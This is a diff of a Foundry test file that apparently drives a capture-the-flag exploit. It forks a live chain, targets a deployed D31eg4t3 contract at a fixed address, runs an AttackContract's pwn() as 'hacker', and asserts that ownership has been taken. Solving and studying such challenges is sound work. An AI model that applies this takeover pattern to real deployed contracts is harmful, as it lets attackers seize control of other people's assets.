@@ -6,22 +6,23 @@ import "../src/D31eg4t3.sol";
 import "../src/AttackContract.sol";
 
 contract CounterTest is Test {
-    address owner = makeAddr("owner");
-    address hacker = makeAddr("hacker");
     D31eg4t3 d31eg4t3;
     AttackContract attackContract;
+    address hacker = makeAddr("hacker");
 
     function setUp() public {
-        vm.startPrank(owner);
-        d31eg4t3 = new D31eg4t3();
-        vm.stopPrank();
+        vm.createSelectFork(vm.envString("INFURA"));
+        d31eg4t3 = D31eg4t3(0x971e55F02367DcDd1535A7faeD0a500B64f2742d);
+        vm.prank(hacker);
+        attackContract = new AttackContract(d31eg4t3);
     }
 
     function testHack() public {
-        vm.startPrank(hacker);
-        attackContract = new AttackContract();
-        bytes data = keccak256(bytes("hacked()"));
-        // d31eg4t3.hackMe(data);
-        d31eg4t3.hacked();
+        console.log("hacker's address: ", hacker); // 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE
+        vm.prank(hacker);
+        attackContract.pwn();
+
+        assertEq(d31eg4t3.owner(), hacker);
+        assertEq(d31eg4t3.canYouHackMe(hacker), true);
     }
 }
